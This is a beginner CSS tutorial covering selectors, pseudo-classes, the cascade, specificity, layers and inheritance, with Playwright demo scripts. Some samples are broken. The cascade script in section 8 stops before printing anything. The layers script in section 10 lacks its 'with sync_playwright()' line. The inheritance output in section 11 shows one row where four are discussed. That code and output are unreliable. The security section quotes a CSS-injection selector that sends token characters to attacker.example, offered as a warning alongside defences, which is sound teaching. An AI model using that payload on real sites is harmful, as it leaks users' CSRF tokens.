<Callout type="tip" title="In one minute">
**CSS** (Cascading Style Sheets) describes how HTML looks: colours, fonts, spacing, layout. A CSS **rule** is a **selector** (which elements) plus **declarations** (`property: value;`). Selectors can target elements by **type** (`p`), **class** (`.card`), **id** (`#main`), **attributes** (`[type="email"]`), **position in the tree** (`nav a`, `ul > li`, `h2 + p`), **state** (`:hover`, `:focus-visible`, `:checked`), and parts of an element (`::before`, `::placeholder`). When several rules set the same property on the same element, the **cascade** picks a winner: `!important` and **cascade layers** first, then **specificity** (ids beat classes beat elements, written as a score like `(1,2,0)`), then **source order** (later wins). Some properties (like `color` and `font`) are **inherited** by children. Keep specificity low, style with classes, avoid ids and `!important`, and use DevTools to see exactly which rule won and why.
</Callout>

## Start from zero

<Callout type="analogy">
HTML is the **skeleton and organs** of a page; CSS is the **clothing and make-up**. Imagine you give a tailor a list of instructions: "everyone wears white shirts", "people in the sales team wear blue shirts", "Sam wears a red shirt". Sam is in the sales team, so two instructions apply to him and they disagree. The tailor needs a rule to decide: **the more specific instruction wins** (an instruction about Sam personally beats one about the whole team, which beats one about everyone). If two instructions are equally specific, the **one written later** wins. That decision process is the **cascade**, and "how specific" is **specificity**.
</Callout>

### Words you need first

| Word | Simple meaning | Example |
| --- | --- | --- |
| **Rule (ruleset)** | Selector plus a block of declarations | `p { color: navy; }` |
| **Selector** | Pattern that chooses elements | `.card`, `nav a` |
| **Declaration** | One `property: value` pair | `color: navy;` |
| **Property** | What to change | `color`, `margin`, `display` |
| **Value** | What to change it to | `navy`, `16px`, `flex` |
| **Class** | Reusable label on elements (`class="card"`) | `.card` |
| **Id** | Unique label on one element (`id="main"`) | `#main` |
| **Pseudo-class** | A state or position | `:hover`, `:first-child` |
| **Pseudo-element** | A part of an element | `::before`, `::placeholder` |
| **Cascade** | Algorithm that picks the winning declaration | |
| **Specificity** | A score for how precise a selector is | `(0,1,1)` |
| **Inheritance** | Children taking some values from parents | text colour |
| **Computed value** | The final value the browser uses | `rgb(0, 0, 128)` |

## What is it?

A CSS rule, piece by piece:

```css
/* selector        declaration block */
.card h2 {
  color: navy;          /* property: value; */
  font-size: 1.5rem;
  margin-block: 0 8px;
}
```

- `.card h2` is the **selector**: every `<h2>` inside an element with class `card`.
- Everything inside `{ }` is the **declaration block**.
- Each line `property: value;` is a **declaration**. The semicolon separates declarations (it's optional after the last one, but always write it).
- `/* ... */` is a comment. CSS has no `//` comments.

How the browser uses it:

1. It parses the HTML into the **DOM** (a tree of elements) and the CSS into the **CSSOM** (a list of rules).
2. For every element and every property, it finds all declarations whose selectors match, and runs the **cascade** to pick one. If none match, it uses **inheritance** (for inherited properties) or the property's **initial value**.
3. It turns that into **computed values**, calculates the **layout** (sizes and positions) and **paints** pixels.

## Why does it matter?

- **Every** website uses CSS. Even with Tailwind or a component library, you are still writing selectors and fighting (or avoiding) cascade problems.
- "Why isn't my style applying?" is the most common CSS question; the answer is almost always specificity, source order, inheritance or a selector that doesn't match.
- Good selector habits make CSS **predictable** and easy to change; bad ones (ids everywhere, deep nesting, `!important`) create stylesheets nobody dares to touch.
- Selectors are also used in JavaScript (`document.querySelector(".card")`), testing tools (Playwright, Cypress) and scraping, so learning them pays off beyond CSS.

## When and where do you use it?

Whenever you style anything. You'll write selectors in `.css` files, `<style>` blocks, CSS Modules, Sass, and inside JavaScript (`querySelectorAll`). The cascade rules are the same everywhere.

## Concepts one by one

### 1. Three ways to add CSS

<Explain>
<What>
1. **External stylesheet:** a separate `.css` file linked in the head with `<link rel="stylesheet" href="/styles.css">`.
2. **Internal (embedded):** a `<style>` element in the head.
3. **Inline:** a `style` attribute on one element, `<p style="color: red">`.
</What>
<Why>
External files are cached by the browser and shared by all pages, so they're the default for real sites. Inline styles beat almost every selector (see the cascade) and can't use pseudo-classes or media queries, so they're hard to override and maintain.
</Why>
<When>
- External: almost always.
- `<style>`: small demos, emails, critical CSS inlined for speed.
- Inline: values set by JavaScript (a progress bar's width) or CSS variables set per element (`style="--progress: 40%"`).
</When>
<Where>
Frameworks compile your CSS (CSS Modules, Tailwind, Sass) into external files automatically.
</Where>
<How>
All three in one page:
</How>
</Explain>

```html noqa
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Ways to add CSS</title>
  <link rel="stylesheet" href="/styles.css">
  <style>
    h1 { color: navy; }
  </style>
</head>
<body>
  <h1>Mango Shop</h1>
  <p style="color: darkgreen">Fresh Kent mangoes today.</p>
</body>
</html>
```

### 2. Basic selectors

<Explain>
<What>
| Selector | Matches | Example |
| --- | --- | --- |
| `*` | Every element (universal) | `* { box-sizing: border-box; }` |
| `p` | Every element of that type | `p { line-height: 1.6; }` |
| `.price` | Every element with that class | `<span class="price">` |
| `#cart` | The element with that id | `<div id="cart">` |
| `p.note` | A `p` that also has class `note` | (no space: same element) |
| `.btn.primary` | Elements with **both** classes | `<button class="btn primary">` |
| `h1, h2, h3` | A **list**: any of these | grouping |
</What>
<Why>
These are the building blocks; everything else combines them.
</Why>
<When>
Use **classes** for almost all styling. Use type selectors for base styles (`body`, `a`, `h1`), and ids mainly for links (`#main`) and JavaScript, not styling.
</When>
<Where>
An element can have many classes (`class="btn primary large"`), but an id must be unique on the page.
</Where>
<How>
A real browser shows which elements each selector matches. The script uses `querySelectorAll`, which uses exactly the same selector engine as CSS.
</How>
</Explain>

```bash
python3 - <<'PY'
from playwright.sync_api import sync_playwright
html = """<!DOCTYPE html><title>t</title>
<main id="shop">
  <h1>Mango Shop</h1>
  <p class="note">Delivery in 2 days.</p>
  <ul>
    <li class="product">Kent <span class="price">Rs 900</span></li>
    <li class="product sale">Keitt <span class="price">Rs 1,100</span></li>
    <li class="product sold-out">Ataulfo <span class="price">Rs 1,300</span></li>
  </ul>
  <button class="btn primary" type="button">Checkout</button>
  <button class="btn" type="button">Continue shopping</button>
</main>"""
selectors = ["li", ".product", ".product.sale", "#shop", ".btn", ".btn.primary", "h1, .note", ".price"]
with sync_playwright() as p:
    browser = p.chromium.launch()
    page = browser.new_page()
    page.set_content(html)
    for sel in selectors:
        found = page.eval_on_selector_all(sel, "els => els.map(e => e.textContent.trim().split(' ')[0])")
        print(f"{sel:14} -> {len(found)}  {found}")
    browser.close()
PY
```

```text output
li             -> 3  ['Kent', 'Keitt', 'Ataulfo']
.product       -> 3  ['Kent', 'Keitt', 'Ataulfo']
.product.sale  -> 1  ['Keitt']
#shop          -> 1  ['Mango']
.btn           -> 2  ['Checkout', 'Continue']
.btn.primary   -> 1  ['Checkout']
h1, .note      -> 2  ['Mango', 'Delivery']
.price         -> 3  ['Rs', 'Rs', 'Rs']
```

Line by line:

- `li` and `.product` both match all three list items, by element type and by class.
- `.product.sale` (no space) needs both classes on the same element, so only Keitt.
- `#shop` matches the `<main>`; the script prints the first word of its text, which starts with the heading "Mango".
- `.btn` matches both buttons; `.btn.primary` only the one with both classes.
- `h1, .note` is a selector **list**: elements matching either part.
- Each line shows the first word of the matched element's text (that's why `.price` prints "Rs").

### 3. Attribute selectors

<Explain>
<What>
Select by attributes and their values:
| Selector | Matches when the attribute… |
| --- | --- |
| `[disabled]` | exists |
| `[type="email"]` | equals exactly |
| `[href^="https"]` | starts with |
| `[href$=".pdf"]` | ends with |
| `[href*="example"]` | contains |
| `[class~="sale"]` | contains the whole word in a space-separated list |
| `[lang\|="en"]` | equals `en` or starts with `en-` |
| `[type="email" i]` | equals, case-insensitively |
</What>
<Why>
Style elements without adding classes: external links, PDF downloads, required fields, form inputs by type, ARIA states.
</Why>
<When>
Form styling (`input[type="checkbox"]`), state from ARIA (`[aria-expanded="true"]`), link types.
</When>
<Where>
Styling by ARIA state (`button[aria-expanded="true"] .icon { rotate: 180deg; }`) keeps visual state and accessibility state in sync automatically.
</Where>
<How>
Testing attribute selectors on some links and inputs:
</How>
</Explain>

```bash
python3 - <<'PY'
from playwright.sync_api import sync_playwright
html = """<!DOCTYPE html><title>t</title>
<a href="https://mangoshop.example/about">About</a>
<a href="http://old.example/">Old site</a>
<a href="/files/price-list.pdf">Price list</a>
<a href="/contact">Contact</a>
<input type="email" required aria-label="Email">
<input type="text" aria-label="Name">
<button type="button" aria-expanded="true">Menu</button>"""
selectors = ['a[href^="https"]', 'a[href$=".pdf"]', 'a[href*="example"]', '[required]',
             'input[type="text"]', '[aria-expanded="true"]']
with sync_playwright() as p:
    browser = p.chromium.launch()
    page = browser.new_page()
    page.set_content(html)
    for sel in selectors:
        found = page.eval_on_selector_all(sel, "els => els.map(e => e.textContent || e.getAttribute('aria-label'))")
        print(f"{sel:24} -> {found}")
    browser.close()
PY
```

```text output
a[href^="https"]         -> ['About']
a[href$=".pdf"]          -> ['Price list']
a[href*="example"]       -> ['About', 'Old site']
[required]               -> ['Email']
input[type="text"]       -> ['Name']
[aria-expanded="true"]   -> ['Menu']
```

Line by line:

- `^=` matched only the https link; the `http://` one doesn't start with "https".
- `$=".pdf"` found the download link, a common way to add a PDF icon.
- `*="example"` matched both links whose URL contains "example" anywhere.
- `[required]` only checks that the attribute exists; it has no value.
- The inputs and button have no text, so the script prints their `aria-label` or text.

### 4. Combinators: relationships between elements

<Explain>
<What>
| Combinator | Name | Matches |
| --- | --- | --- |
| `A B` (space) | Descendant | B anywhere inside A |
| `A > B` | Child | B directly inside A (one level) |
| `A + B` | Next sibling | B immediately after A, same parent |
| `A ~ B` | Subsequent sibling | any B after A, same parent |
</What>
<Why>
Style elements based on where they are: links inside the nav, the paragraph right after a heading, items in a top-level list but not nested lists.
</Why>
<When>
Keep them short. `nav a` is fine; `body main section .content ul li a span` is fragile (it breaks when HTML changes) and highly specific.
</When>
<Where>
Selectors are read by browsers **right to left**: for `nav a`, the browser checks each `a` and walks up looking for a `nav`. That's fast for normal selectors, so don't worry about selector performance in everyday CSS.
</Where>
<How>
A nested list shows the difference between descendant and child:
</How>
</Explain>

```bash
python3 - <<'PY'
from playwright.sync_api import sync_playwright
html = """<!DOCTYPE html><title>t</title>
<ul class="menu">
  <li>Fruit
    <ul><li>Mangoes</li><li>Bananas</li></ul>
  </li>
  <li>Vegetables</li>
</ul>
<h2>Delivery</h2>
<p>First paragraph after h2</p>
<p>Second paragraph</p>
<p>Third paragraph</p>"""
selectors = [".menu li", ".menu > li", "h2 + p", "h2 ~ p"]
with sync_playwright() as p:
    browser = p.chromium.launch()
    page = browser.new_page()
    page.set_content(html)
    for sel in selectors:
        found = page.eval_on_selector_all(sel, "els => els.map(e => e.firstChild.textContent.trim())")
        print(f"{sel:11} -> {found}")
    browser.close()
PY
```

```text output
.menu li    -> ['Fruit', 'Mangoes', 'Bananas', 'Vegetables']
.menu > li  -> ['Fruit', 'Vegetables']
h2 + p      -> ['First paragraph after h2']
h2 ~ p      -> ['First paragraph after h2', 'Second paragraph', 'Third paragraph']
```

Line by line:

- `.menu li` (descendant) matches all four list items, including the nested Mangoes and Bananas.
- `.menu > li` (child) matches only the two top-level items.
- `h2 + p` matches only the paragraph directly after the heading, useful for removing the top margin of the first paragraph after a heading.
- `h2 ~ p` matches every later paragraph sibling.

### 5. Pseudo-classes: state and position

<Explain>
<What>
A pseudo-class starts with one colon and selects elements in a particular **state** or **position**:
- **User action:** `:hover`, `:active`, `:focus`, `:focus-visible` (keyboard focus), `:focus-within` (focus is inside).
- **Links:** `:link` (unvisited), `:visited`.
- **Forms:** `:checked`, `:disabled`, `:enabled`, `:required`, `:optional`, `:valid`, `:invalid`, `:user-invalid` (invalid after the user interacted), `:placeholder-shown`.
- **Tree position:** `:first-child`, `:last-child`, `:only-child`, `:nth-child(2)`, `:nth-child(odd)`, `:nth-child(3n+1)`, `:nth-last-child()`, `:first-of-type`, `:nth-of-type()`, `:empty`, `:root` (the `<html>` element).
- **Logic:** `:not(...)`, `:is(...)`, `:where(...)`, `:has(...)`.
- **Other:** `:target` (the element whose id is in the URL's `#hash`).
</What>
<Why>
They let CSS react to interaction and structure without JavaScript or extra classes: zebra-striped tables, hover effects, error styles, open menus.
</Why>
<When>
Interactive states on every link, button and input; `:nth-child` for patterns; `:has` for "parent selectors".
</When>
<Where>
`:nth-child(an+b)`: `n` counts 0, 1, 2…; `2n` is even (2, 4, 6), `2n+1` or `odd` is odd, `3n+1` is 1, 4, 7…, `-n+3` is the first three. Use `:user-invalid` rather than `:invalid` for error styling, so empty forms don't start out red.
</Where>
<How>
Hover, focus and tick the boxes in the result below.
</How>
</Explain>

```html preview h=260 noqa
<style>
  body { font-family: system-ui, sans-serif; }
  li:nth-child(odd) { background: #f3f4f6; }
  li:first-child { font-weight: bold; }
  li:last-child { color: #6b7280; }
  a:hover { text-decoration-thickness: 3px; }
  a:focus-visible, input:focus-visible { outline: 3px solid #2563eb; outline-offset: 2px; }
  input:user-invalid { border: 2px solid #b91c1c; }
  label:has(input:checked) { color: #15803d; font-weight: 600; }
  .form-row:focus-within { background: #eff6ff; }
</style>
<ul>
  <li>Kent (first child, bold)</li><li>Keitt</li><li>Ataulfo</li><li>Honey (last child, grey)</li>
</ul>
<p><a href="#">Hover or Tab to me</a></p>
<p class="form-row"><label>Email <input type="email" required></label> (type "abc" then click outside)</p>
<p><label><input type="checkbox"> Gift wrap</label> <label><input type="checkbox"> Express delivery</label></p>
```

Line by line:

- `li:nth-child(odd)` stripes the 1st and 3rd items; `:first-child` and `:last-child` style the ends.
- `a:hover` thickens the underline when the mouse is over the link.
- `:focus-visible` draws a blue ring for keyboard focus.
- `input:user-invalid` turns the border red only after the user has typed something invalid and left the field.
- `label:has(input:checked)` styles a label when its checkbox is ticked: `:has` lets you style an element based on what it **contains**, which CSS couldn't do before 2023.
- `.form-row:focus-within` highlights the whole row while the input inside it has focus.

### 6. :not, :is, :where and :has

<Explain>
<What>
- **`:not(X)`** matches elements that **don't** match X: `.btn:not(.primary)`, `li:not(:last-child)`.
- **`:is(A, B, C)`** matches any element matching any selector in the list: `:is(h1, h2, h3) a` instead of `h1 a, h2 a, h3 a`.
- **`:where(A, B)`** is the same as `:is`, but contributes **zero** specificity.
- **`:has(X)`** matches an element if X matches something **relative to it** (inside it by default, or after it with `:has(+ X)`): `.card:has(img)`, `form:has(:user-invalid)`.
</What>
<Why>
Shorter selectors, fewer classes, and `:where` lets libraries write default styles that are easy to override.
</Why>
<When>
`li:not(:last-child)` for separators; `:is` to group; `:where` for resets and base styles; `:has` for parent and conditional styling.
</When>
<Where>
Specificity: `:not`, `:is` and `:has` take the specificity of their **most specific** argument; `:where` always counts zero. `:has` is supported in all modern browsers since late 2023.
</Where>
<How>
The browser confirms what each matches:
</How>
</Explain>

```bash
python3 - <<'PY'
from playwright.sync_api import sync_playwright
html = """<!DOCTYPE html><title>t</title>
<div class="card" id="c1"><img src="a.jpg" alt="Kent"><h3>Kent</h3></div>
<div class="card" id="c2"><h3>Keitt</h3></div>
<button class="btn primary" type="button">Buy</button>
<button class="btn" type="button">Save</button>
<ul><li>One</li><li>Two</li><li>Three</li></ul>
<h2>Offers <a href="#o">#</a></h2><h3>Kent <a href="#k">#</a></h3>"""
selectors = [".card:has(img)", ".card:not(:has(img))", ".btn:not(.primary)",
             "li:not(:last-child)", ":is(h2, h3) a", ":where(h2, h3) a"]
with sync_playwright() as p:
    browser = p.chromium.launch()
    page = browser.new_page()
    page.set_content(html)
    for sel in selectors:
        found = page.eval_on_selector_all(sel, "els => els.map(e => e.id || e.textContent.trim() || e.getAttribute('href'))")
        print(f"{sel:22} -> {found}")
    browser.close()
PY
```

```text output
.card:has(img)         -> ['c1']
.card:not(:has(img))   -> ['c2']
.btn:not(.primary)     -> ['Save']
li:not(:last-child)    -> ['One', 'Two']
:is(h2, h3) a          -> ['#', '#']
:where(h2, h3) a       -> ['#', '#']
```

Line by line:

- `.card:has(img)` selected the card containing an image, and `:not(:has(img))` the one without. Before `:has`, you needed JavaScript or an extra class like `.card--with-image`.
- `.btn:not(.primary)` is every button except the primary one.
- `li:not(:last-child)` is the classic "add a border or comma between items, but not after the last".
- `:is(h2, h3) a` and `:where(h2, h3) a` match the same elements; the difference is only in specificity (concept 9).

### 7. Pseudo-elements: parts of an element

<Explain>
<What>
A pseudo-element starts with **two colons** and styles a **part** of an element, or adds generated content:
- `::before` / `::after`: insert content before or after the element's content (requires the `content` property).
- `::first-line`, `::first-letter`: typography effects.
- `::placeholder`: an input's placeholder text.
- `::marker`: list bullets and numbers.
- `::selection`: text the user highlighted.
- `::file-selector-button`, `::backdrop` (behind a modal `<dialog>`).
</What>
<Why>
Decorative icons, required-field asterisks, quotation marks, custom bullets and badges without extra HTML.
</Why>
<When>
Decoration only. Content added with `::before`/`::after` is not selectable and is read inconsistently by screen readers, so never put important information there.
</When>
<Where>
Old CSS used one colon (`:before`); browsers still accept it for the old four, but write two colons.
</Where>
<How>
Several pseudo-elements in one example:
</How>
</Explain>

```html preview h=230 noqa
<style>
  body { font-family: system-ui, sans-serif; }
  .required::after { content: " *"; color: #b91c1c; }
  .badge::before { content: "★ "; color: #f59e0b; }
  input::placeholder { color: #6b7280; font-style: italic; }
  ul.ticks li::marker { content: "✓  "; color: #15803d; }
  p.lead::first-letter { font-size: 2em; font-weight: bold; color: #b45309; }
  ::selection { background: #fde68a; }
</style>
<p class="lead">Mangoes arrive fresh from the farm every morning. Select some of this text.</p>
<p><label class="required" for="name">Name</label> <input id="name" placeholder="e.g. Sam Lee"></p>
<p><span class="badge">Best seller</span></p>
<ul class="ticks"><li>Free delivery</li><li>Fresh guarantee</li></ul>
```

Line by line:

- `.required::after` adds a red asterisk after the label text; the `content` property is what creates it.
- `.badge::before` inserts a star before "Best seller".
- `::placeholder` styles the hint text inside the input.
- `::marker` with `content` replaces the bullet with a tick.
- `::first-letter` creates a drop-cap effect, and `::selection` colours highlighted text.

### 8. The cascade: which declaration wins

<Explain>
<What>
When several declarations set the same property on the same element, the browser compares them **in this order**, stopping at the first difference:
1. **Origin and importance:** browser defaults (user-agent styles) < user styles < author styles (your CSS). `!important` reverses the order: important author < important user < important browser.
2. **Context:** for Shadow DOM, styles inside vs outside a component.
3. **Element-attached styles:** the `style` attribute beats any selector.
4. **Cascade layers:** declarations in later `@layer`s beat earlier layers; styles **not in any layer** beat all layers.
5. **Specificity:** the higher score wins.
6. **Order of appearance:** the last one wins.
</What>
<Why>
Knowing this order turns "random" CSS behaviour into a predictable process.
</Why>
<When>
Every time a style "doesn't work".
</When>
<Where>
In practice you'll mostly meet steps 5 and 6, plus inline styles and `!important`.
</Where>
<How>
The same paragraphs, five competing rules, and the colour the browser actually computed for each:
</How>
</Explain>

```bash
python3 - <<'PY'
from playwright.sync_api import sync_playwright
html = """<!DOCTYPE html><title>t</title><style>
p { color: black; }                  /* (0,0,1) */
article p { color: orange; }         /* (0,0,2) */
.note { color: green; }              /* (0,1,0) */
p.note.important { color: purple; }  /* (0,2,1) */
#intro { color: blue; }              /* (1,0,0) */
</style>
<article>
  <p id="intro" class="note">First</p>
  <p class="note">Second</p>
  <p class="note important">Third</p>
  <p>Fourth</p>
  <p class="note" style="color: red">Fifth</p>
</article>
<p>Outside</p>"""
with sync_playwright() as p:
    browser = p.chromium.launch()
    page = browser.new_page()
    page.set_content(html)
```

### 9. Calculating specificity

<Explain>
<What>
Specificity is three numbers **(A, B, C)**, compared left to right like version numbers:
- **A:** number of **id** selectors (`#cart`).
- **B:** number of **classes**, **attribute** selectors and **pseudo-classes** (`.btn`, `[type="email"]`, `:hover`).
- **C:** number of **type** selectors and **pseudo-elements** (`p`, `::before`).
- The universal selector `*` and combinators (` `, `>`, `+`, `~`) count **nothing**.
- `:is()`, `:not()` and `:has()` count as their most specific argument; `:where()` counts zero.
</What>
<Why>
So you can predict winners and keep your selectors at a similar, low level.
</Why>
<When>
When reading unfamiliar CSS, or when two rules fight.
</When>
<Where>
DevTools shows specificity when you hover a selector in the Styles panel.
</Where>
<How>
A small calculator (it handles common selectors, not every edge case) and a sort by specificity:
</How>
</Explain>

```bash
python3 - <<'PY'
import re

def specificity(selector):
    s = selector
    a = b = c = 0
    # :where(...) counts zero: remove it entirely
    s = re.sub(r":where\([^)]*\)", "", s)
    # :is/:not/:has count as their most specific argument
    def most_specific(m):
        nonlocal a, b, c
        best = max((specificity(part.strip()) for part in m.group(2).split(",")), default=(0, 0, 0))
        a, b, c = a + best[0], b + best[1], c + best[2]
        return ""
    s = re.sub(r":(is|not|has)\(([^)]*)\)", most_specific, s)
    c += len(re.findall(r"::[\w-]+", s)); s = re.sub(r"::[\w-]+", "", s)
    a += len(re.findall(r"#[\w-]+", s))
    b += len(re.findall(r"\.[\w-]+", s)) + len(re.findall(r"\[[^\]]+\]", s)) + len(re.findall(r":[\w-]+(\([^)]*\))?", s))
    s = re.sub(r"#[\w-]+|\.[\w-]+|\[[^\]]+\]|:[\w-]+(\([^)]*\))?", "", s)
    c += len(re.findall(r"(?<![\w-])[a-zA-Z][\w-]*", s))
    return (a, b, c)

selectors = ["*", "p", "article p", ".note", "p.note", "a:hover", "input[type=email]",
             "nav > ul li a", "#cart", "#cart .item", "li::marker", ".btn:not(.primary)",
             ":is(#main, .side) a", ":where(#main, .side) a"]
for sel in sorted(selectors, key=specificity):
    print(f"{str(specificity(sel)):10} {sel}")
PY
```

```text output
(0, 0, 0)  *
(0, 0, 1)  p
(0, 0, 1)  :where(#main, .side) a
(0, 0, 2)  article p
(0, 0, 2)  li::marker
(0, 0, 4)  nav > ul li a
(0, 1, 0)  .note
(0, 1, 1)  p.note
(0, 1, 1)  a:hover
(0, 1, 1)  input[type=email]
(0, 2, 0)  .btn:not(.primary)
(1, 0, 0)  #cart
(1, 0, 1)  :is(#main, .side) a
(1, 1, 0)  #cart .item
```

Line by line:

- `*` scores nothing; `p` is one element `(0,0,1)`.
- `:where(#main, .side) a` is only `(0,0,1)`: the `:where` part counts zero, so this rule is as easy to override as a plain `a`.
- `nav > ul li a` is four elements `(0,0,4)`, yet still **loses** to a single class `.note` `(0,1,0)`, because B is compared before C.
- `a:hover` and `input[type=email]` each have one pseudo-class/attribute (B) and one element (C).
- `.btn:not(.primary)` counts `.btn` plus the argument `.primary`: `(0,2,0)`.
- `:is(#main, .side) a` takes its most specific argument, `#main`, so `(1,0,1)`, even when it's matching through `.side`. That's a common surprise.
- `#cart .item` is the highest: any selector with an id beats all selectors without one.

### 10. !important, inline styles and cascade layers

<Explain>
<What>
- **`!important`** after a value (`color: red !important;`) moves that declaration to a higher-priority group, above normal declarations of any specificity, including inline styles. Among important declarations, specificity and order apply again.
- **Inline styles** beat selectors, but lose to `!important` in a stylesheet.
- **Cascade layers** (`@layer reset, base, components, utilities;`) let you decide priority by **layer order** instead of specificity: a rule in a later layer wins over a rule in an earlier layer, whatever their specificity. Unlayered styles beat all layers.
</What>
<Why>
`!important` is a sledgehammer: once used, the only way to override it is another `!important`, and stylesheets end up full of them. Layers solve the underlying problem (third-party or base styles that are too specific) cleanly.
</Why>
<When>
- `!important`: utility classes that must always win (Tailwind can generate them), overriding inline styles from third-party widgets, and user stylesheets for accessibility. Avoid it in normal component CSS.
- Layers: organising a design system or isolating third-party CSS (`@import url(lib.css) layer(vendor);`). Tailwind v4 uses layers internally.
</When>
<Where>
Supported in all modern browsers since 2022.
</Where>
<How>
A real browser shows layers beating specificity, `!important` beating inline styles, and unlayered CSS beating layers:
</How>
</Explain>

```bash
python3 - <<'PY'
from playwright.sync_api import sync_playwright
html = """<!DOCTYPE html><title>t</title><style>
@layer base, components;
@layer components { .btn { color: green; } }
@layer base { #buy.btn.primary { color: gray; } }
.link { color: navy; }
.warn { color: orange !important; }
</style>
<button id="buy" class="btn primary" type="button">Buy</button>
<a class="link" href="#" style="color: red">Inline red loses?</a>
<p class="warn" style="color: red">Important vs inline</p>
<a class="link" href="#">Plain link</a>"""

    browser = p.chromium.launch()
    page = browser.new_page()
    page.set_content(html)
    for text, colour in page.eval_on_selector_all("button, a, p", "els => els.map(e => [e.textContent, getComputedStyle(e).color])"):
        print(f"{text:20} {colour}")
    browser.close()
PY
```

```text output
Buy                  rgb(0, 128, 0)
Inline red loses?    rgb(255, 0, 0)
Important vs inline  rgb(255, 165, 0)
Plain link           rgb(0, 0, 128)
```

Line by line:

- `@layer base, components;` declares the layer order: `components` comes later, so it has **higher** priority.
- **Buy:** `#buy.btn.primary` `(1,2,0)` in `base` loses to the much weaker `.btn` `(0,1,0)` in `components`. Layer order is checked **before** specificity, so it's **green**.
- **Inline red loses?** No: the inline `style` beats the `.link` class, so it's red.
- **Important vs inline:** `.warn { color: orange !important }` beats the inline red, so orange.
- **Plain link:** only `.link` applies (unlayered), navy `rgb(0, 0, 128)`.

### 11. Inheritance and the global keywords

<Explain>
<What>
Some properties are **inherited**: if an element has no declaration for them, it takes its parent's computed value. Mostly text-related ones: `color`, `font-*`, `line-height`, `text-align`, `letter-spacing`, `visibility`, `cursor`, `list-style`. Most others (`margin`, `padding`, `border`, `background`, `width`, `display`) are **not** inherited; they start at their **initial** value.
Keywords that work on every property:
- `inherit`: take the parent's value.
- `initial`: the property's initial value from the spec (e.g. `color: initial` is usually black).
- `unset`: `inherit` for inherited properties, `initial` for others.
- `revert`: go back to the browser's default style for that element.
- `all: unset` applies one of these to all properties at once.
</What>
<Why>
Inheritance is why you can set `font-family` and `color` once on `body`, and every element follows.
</Why>
<When>
Set text styles high in the tree (`body`, a component root). Use `inherit` for things like `button { font: inherit; }`, because form controls don't inherit fonts by default.
</When>
<Where>
Inherited values have **no specificity**: any rule that matches the element directly, even `*`, beats an inherited value. A common surprise is `.card { color: red }` not affecting `a` inside the card: links have their own colour from the browser's styles, which matches them directly.
</Where>
<How>
Checking computed values:
</How>
</Explain>

```bash
python3 - <<'PY'
from playwright.sync_api import sync_playwright
html = """<!DOCTYPE html><title>t</title><style>
.card { color: rgb(30, 64, 175); font-family: Georgia, serif; border: 2px solid black; padding: 12px; }
.inherit-link { color: inherit; }
</style>
<div class="card">
  <p id="text">Card text</p>
  <a id="plain" href="#">Normal link</a>
  <a id="fixed" class="inherit-link" href="#">Inheriting link</a>
  <button id="btn" type="button">Button</button>
</div>"""
with sync_playwright() as p:
    browser = p.chromium.launch()
    page = browser.new_page()
    page.set_content(html)
    for el in ["#text", "#plain", "#fixed", "#btn"]:
        cs = page.eval_on_selector(el, "e => { const s = getComputedStyle(e); return [s.color, s.fontFamily, s.borderTopWidth] }")
        print(f"{el:7} color={cs[0]:18} font={cs[1]:16} border={cs[2]}")
    browser.close()
PY
```

```text output

#plain  color=rgb(0, 0, 238)     font=Georgia, serif   border=0px
```

Line by line:

- `#text` inherited both the colour and the font from `.card`, but **not** the border: `border` isn't inherited.
- `#plain` inherited the font, but its colour is the browser's default link blue `rgb(0, 0, 238)`, because the browser's `a:link` rule matches the link directly.

## Real-world example

Large codebases often suffer **specificity wars**. A developer needs a button to be red, writes `.btn.danger`, but an older rule `#sidebar .widget button` (1,1,1) wins, so they write `#sidebar .widget .btn.danger` (1,3,0), and later someone needs to override that with `!important`. After a few years the stylesheet is thousands of lines no one can safely change. Teams fix this with conventions that keep specificity flat: **BEM** naming (`.card__title--large`, one class per selector), **CSS Modules** (class names scoped per component automatically), **utility-first CSS** like Tailwind (single-class utilities), and **cascade layers** to separate resets, third-party CSS, components and utilities. Bootstrap 5 and many design systems now use `:where()` or layers for base styles precisely so that application CSS can override them with a single class.

## Common mistakes

- **Styling with ids,** which makes rules hard to override.
- **Long, deeply nested selectors** (`.page .main .content ul li a`) that break when the HTML changes.
- **Reaching for `!important`** instead of understanding the cascade.
- **Confusing `.a.b` (same element) with `.a .b` (descendant).**
- **Expecting non-inherited properties to inherit** (border, background, margin) or form controls to inherit fonts.
- **Using `:invalid` for error styles,** which marks empty required fields red before the user types.
- **Putting meaningful content in `::before`/`::after`.**
- **Single colon for pseudo-elements** or forgetting `content` in `::before`.
- **Removing focus outlines** with `:focus { outline: none }` and no replacement.
- **Guessing instead of opening DevTools.**

## Security lens

<Callout type="security">
CSS is not just decoration: it can leak data and be used for UI tricks, so treat untrusted CSS as untrusted code.
</Callout>

- **CSS injection:** if users can inject CSS (a "custom theme" field, unescaped `style` attribute values), attribute selectors can **exfiltrate data**: `input[name="csrf"][value^="a"] { background: url(https://attacker.example/?a) }` makes the browser send a request for each matching character, leaking tokens one character at a time. Never insert untrusted input into `<style>` or `style` attributes, and use a **Content Security Policy** that restricts `style-src` and `img-src`.
- **`:visited` privacy:** browsers limit which properties `:visited` can change and lie to `getComputedStyle`, to stop sites from detecting which URLs you've visited.
- **Clickjacking and UI redressing:** CSS can make elements invisible (`opacity: 0`) or overlay fake buttons over real ones. Protect sensitive pages from being framed with `X-Frame-Options` or CSP `frame-ancestors`.
- **Hidden content isn't secret:** `display: none` hides text visually, but it's still in the HTML and readable by anyone. Never "hide" data or admin links with CSS.

## Interview questions

<QA q="How does the browser decide which CSS rule applies when several match?">
It runs the cascade. It compares origin and importance first, so important declarations and author styles have priority over normal and browser styles, then element-attached inline styles, then cascade layer order, then specificity, and finally source order, where the later declaration wins. If no declaration applies, inherited properties take the parent's value and others use their initial value.
</QA>

<QA q="How is specificity calculated?">
It is a tuple of three counts compared left to right: id selectors; classes, attribute selectors and pseudo-classes; and type selectors and pseudo-elements. The universal selector and combinators add nothing. The is, not and has pseudo-classes take the specificity of their most specific argument, and where always contributes zero. A single id beats any number of classes, and a single class beats any number of elements.
</QA>

<QA q="What is the difference between :is() and :where()?">
Both match an element if it matches any selector in their argument list. The is pseudo-class takes the specificity of its most specific argument, while where always has zero specificity, which makes it useful for base or library styles that should be easy to override.
</QA>

<QA q="What is the difference between a pseudo-class and a pseudo-element?">
A pseudo-class, written with one colon, selects an element in a particular state or position, such as hover, focus-visible, checked or nth-child. A pseudo-element, written with two colons, targets a part of an element or generated content, such as before, after, first-line, placeholder or marker.
</QA>

